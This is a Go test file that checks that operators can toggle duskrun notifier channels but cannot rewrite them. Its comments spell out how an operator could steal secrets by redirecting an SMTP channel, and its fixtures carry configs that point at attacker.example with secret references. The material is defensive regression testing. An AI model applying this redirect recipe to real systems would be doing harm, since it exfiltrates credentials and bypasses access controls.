package api

import (
	"encoding/json"
	"net/http"
	"strconv"
	"testing"

	"github.com/duskrun/duskrun/internal/core"
)

// smtpConfig is a channel that validates without touching the secret store: no
// username means no password, so New() has nothing to resolve.
const smtpConfig = `{"host":"smtp.corp.io","port":587,"tls":"starttls","from":"duskrun@corp.io","to":["ops@corp.io"]}`

// TestOperatorMayToggleChannelButNotRewriteIt pins the privilege boundary that
// PATCH /notifiers/{id} used to leave open.
//
// Creating and deleting a channel were already admin because a channel config
// names a secret and the host that secret is presented to. Editing was not, so
// an operator could take an existing channel, point it at an SMTP server it
// controls, aim password_ref at any secret in the store and read the plaintext
// off its own AUTH PLAIN — reaching secrets it cannot read through /secrets,
// and leaving only a successful delivery-log line behind.
//
// Subscribing a channel to events stays operator: that is the events × channels
// matrix, and it cannot choose either the secret or the destination.
func TestOperatorMayToggleChannelButNotRewriteIt(t *testing.T) {
	srv, _ := authServer(t)
	admin := loginAs(t, srv, core.RoleAdmin)
	operator := loginAs(t, srv, core.RoleOperator)

	// Admin creates the channel the operator will try to subvert.
	resp := doJSON(t, srv, http.MethodPost, "/api/notifiers", admin, map[string]any{
		"name": "ops-mail", "type": "smtp",
		"config": json.RawMessage(smtpConfig),
		"events": []string{"failure"},
	})
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusCreated {
		t.Fatalf("admin create: status %d", resp.StatusCode)
	}
	var created struct {
		ID int64 `json:"id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&created); err != nil {
		t.Fatal(err)
	}
	path := "/api/notifiers/" + strconv.FormatInt(created.ID, 10)

	t.Run("operator may resubscribe", func(t *testing.T) {
		// Exactly what the matrix sends: identity fields echoed, config absent.
		r := doJSON(t, srv, http.MethodPatch, path, operator, map[string]any{
			"name": "ops-mail", "type": "smtp",
			"events": []string{"failure", "success"}, "enabled": false,
		})
		defer r.Body.Close()
		if r.StatusCode != http.StatusOK {
			t.Fatalf("status = %d, want 200 — the operator must keep the matrix", r.StatusCode)
		}
	})

	t.Run("operator may echo the masked config back", func(t *testing.T) {
		// A client that read the listing sends "••••" for every credential.
		// That round trip is not an edit and must not be denied.
		var list []notifierDTO
		decodeInto(t, authGet(t, srv.URL+"/api/notifiers"), &list)
		var masked json.RawMessage
		for _, c := range list {
			if c.ID == created.ID {
				masked = c.Config
			}
		}
		if len(masked) == 0 {
			t.Fatal("channel missing from the listing")
		}
		r := doJSON(t, srv, http.MethodPatch, path, operator, map[string]any{
			"name": "ops-mail", "type": "smtp", "config": masked,
			"events": []string{"failure"},
		})
		defer r.Body.Close()
		if r.StatusCode != http.StatusOK {
			t.Fatalf("status = %d, want 200 — re-sending the mask is not a change", r.StatusCode)
		}
	})

	// Each of these is the escalation in a different disguise.
	denied := []struct {
		name string
		body map[string]any
	}{
		{"repointed host and a new password_ref", map[string]any{
			"name": "ops-mail", "type": "smtp",
			"config": json.RawMessage(`{"host":"attacker.example","port":587,"tls":"starttls",` +
				`"username":"x","password_ref":"secret://smtp/prod","from":"a@corp.io","to":["b@corp.io"]}`),
		}},
		{"switched plugin type", map[string]any{
			"name": "ops-mail", "type": "webhook",
			"config": json.RawMessage(`{"url":"https://attacker.example/","token_ref":"secret://telegram/ops-bot"}`),
		}},
		{"renamed channel", map[string]any{
			"name": "not-ops-mail", "type": "smtp",
			"config": json.RawMessage(smtpConfig),
		}},
	}
	for _, c := range denied {
		t.Run("operator may not: "+c.name, func(t *testing.T) {
			r := doJSON(t, srv, http.MethodPatch, path, operator, c.body)
			defer r.Body.Close()
			if r.StatusCode != http.StatusForbidden {
				t.Fatalf("status = %d, want 403", r.StatusCode)
			}
		})
	}

	t.Run("denials left the stored config untouched", func(t *testing.T) {
		var list []notifierDTO
		decodeInto(t, authGet(t, srv.URL+"/api/notifiers"), &list)
		for _, c := range list {
			if c.ID != created.ID {
				continue
			}
			if c.Name != "ops-mail" || c.Type != "smtp" {
				t.Fatalf("channel is now %s/%s — a denied PATCH still landed", c.Name, c.Type)
			}
			var cfg map[string]any
			if err := json.Unmarshal(c.Config, &cfg); err != nil {
				t.Fatal(err)
			}
			if cfg["host"] != "smtp.corp.io" {
				t.Fatalf("host = %v, want smtp.corp.io", cfg["host"])
			}
			if _, ok := cfg["password_ref"]; ok {
				t.Fatal("password_ref appeared on a channel the operator was denied")
			}
			return
		}
		t.Fatal("channel missing from the listing")
	})

	t.Run("admin may still rewrite it", func(t *testing.T) {
		r := doJSON(t, srv, http.MethodPatch, path, admin, map[string]any{
			"name": "ops-mail", "type": "smtp",
			"config": json.RawMessage(`{"host":"smtp2.corp.io","port":587,"tls":"starttls",` +
				`"from":"duskrun@corp.io","to":["ops@corp.io"]}`),
		})
		defer r.Body.Close()
		if r.StatusCode != http.StatusOK {
			t.Fatalf("status = %d, want 200 — the boundary must not lock admins out", r.StatusCode)
		}
	})
}

// TestSameJSONIgnoresSerialisation: the config comparison decides whether a
// PATCH counts as an edit, so it must not mistake re-serialisation for one —
// nor wave through a real change it failed to parse.
func TestSameJSONIgnoresSerialisation(t *testing.T) {
	cases := []struct {
		name string
		a, b string
		want bool
	}{
		{"key order", `{"a":1,"b":2}`, `{"b":2,"a":1}`, true},
		{"whitespace", "{\n  \"a\": 1\n}", `{"a":1}`, true},
		{"absent vs empty object", ``, `{}`, true},
		{"absent vs absent", ``, ``, true},
		{"changed value", `{"host":"a"}`, `{"host":"b"}`, false},
		{"added key", `{"host":"a","password_ref":"x"}`, `{"host":"a"}`, false},
		{"nested change", `{"o":{"k":1}}`, `{"o":{"k":2}}`, false},
		// Unparseable input must fail closed: equal would admit the edit.
		{"broken json", `{"host":`, `{"host":"a"}`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := sameJSON(json.RawMessage(c.a), json.RawMessage(c.b)); got != c.want {
				t.Fatalf("sameJSON = %v, want %v", got, c.want)
			}
		})
	}
}
